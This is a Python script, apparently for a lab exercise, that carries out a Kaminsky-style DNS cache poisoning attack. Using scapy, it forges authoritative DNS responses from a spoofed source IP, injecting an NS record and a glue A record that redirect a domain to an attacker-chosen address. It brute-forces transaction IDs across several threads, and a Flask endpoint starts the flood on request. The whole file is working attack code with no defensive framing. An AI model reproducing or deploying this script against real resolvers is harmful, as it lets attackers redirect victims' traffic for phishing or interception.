from scapy.all import *
from flask import Flask, request
import threading

app = Flask("kaminsky")
SOURCE = "192.168.1.15"
REDIRECT_TO = "192.168.1.6"
DESTINATION = "192.168.1.3"

SOURCE_PORT = 53
DESTINATION_PORT = 12345

WEBSITE = "web1.legit.com"
FROM_DNS = "legit.com"

BRUTEFORCE_TRIES = 200
MODULO = 65000
TTL = 60000

THREADS = 5

crafted_resp = (IP(dst=DESTINATION,
                   src=SOURCE) /
                UDP(dport=DESTINATION_PORT, sport=SOURCE_PORT) /
                DNS(id=1, qr=1, aa=1,
                    qd=DNSQR(qname=WEBSITE),
                    ns=DNSRR(rrname=WEBSITE, type='NS',
                             ttl=TTL,
                             rdata=FROM_DNS),
                    ar=DNSRR(rrname=FROM_DNS, type='A',
                             ttl=TTL, rdata=REDIRECT_TO)))

dns_layer = crafted_resp[DNS]
s = conf.L3socket()


def attack(start):
    for i in range(start, start + BRUTEFORCE_TRIES):
        dns_layer.id = i % MODULO
        s.send(crafted_resp)
    return 'done'


@app.route('/', methods=['GET'])
def start_attack():
    qid = int(request.args.get('start_qid'))
    for i in range(0, THREADS):
        threading.Thread(target=attack, args=(qid,)).start()
        qid += BRUTEFORCE_TRIES
    return 'done'


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=9696)
